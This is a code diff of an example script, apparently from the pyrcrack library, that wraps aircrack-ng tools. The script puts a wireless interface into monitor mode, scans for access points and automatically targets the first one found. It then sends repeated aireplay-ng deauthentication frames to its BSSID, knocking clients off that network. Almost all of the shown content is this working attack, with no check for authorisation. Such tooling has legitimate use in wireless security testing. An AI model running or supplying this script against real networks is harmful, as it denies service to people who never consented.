@@ -4,46 +4,45 @@ from contextlib import suppress
 from rich.console import Console
 
 import asyncio
-import pyrcrack
+from pyrcrack import AirodumpNg, AireplayNg, AirmonNg, MONITOR
 
 CONSOLE = Console()
 CONSOLE.clear()
 CONSOLE.show_cursor(False)
 
 
-async def attack(apo):
-    """Run aireplay deauth attack."""
-    airmon = pyrcrack.AirmonNg()
-    interfaces = await airmon.interfaces
-    CONSOLE.print("Starting airmon-ng with channel {}".format(apo.channel))
-    interface = interfaces[0]
-    async with airmon(interface.interface, apo.channel) as mon:
-        async with pyrcrack.AireplayNg() as aireplay:
-            CONSOLE.print("Starting aireplay on {} for {}".format(
-                mon.monitor_interface, apo.bssid))
-            await aireplay.run(mon.monitor_interface,
-                               deauth=10,
-                               D=True,
-                               b=apo.bssid)
-            while True:
-                CONSOLE.print(aireplay.meta)
-                await asyncio.sleep(2)
-
-
 async def deauth():
     """Scan for targets, return json."""
-    airmon = pyrcrack.AirmonNg()
-    interfaces = await airmon.interfaces
-    async with airmon(interfaces[0].interface) as mon:
-        async with pyrcrack.AirodumpNg() as pdump:
-            async for result in pdump(mon.monitor_interface):
+    # Select first available interface matching wlp0*
+    airmon = AirmonNg()
+    interface_ = await airmon.select_interface('wlp0.*')
+    ap_ = None
+
+    CONSOLE.print('Selected Interface {}'.format(interface_))
+
+    async with airmon(interface_):
+        await asyncio.sleep(2)
+        async with AirodumpNg() as pdump:
+            async for result in pdump(MONITOR):
                 CONSOLE.print(result.table)
+                # For this example, force the first result
                 with suppress(KeyError):
-                    ap = result[0]
-                    CONSOLE.print('Selected AP {}'.format(ap.bssid))
+                    ap_ = result[0]
+                    CONSOLE.print('Selected AP {}'.format(ap_.bssid))
                     break
                 await asyncio.sleep(3)
-    await attack(ap)
+
+    if not ap_:
+        # We didn't manage to getan AP, and somehow the process died.
+        CONSOLE.print("No APs available")
+        return
+
+    # Change channel with airmon-ng
+    async with airmon(interface_, ap_.channel):
+        async with AireplayNg() as aireplay:
+            async for res in aireplay(MONITOR, deauth=10, D=True, b=ap_.bssid):
+                CONSOLE.print(res.table)
+                await asyncio.sleep(3)
 
 
 asyncio.run(deauth())
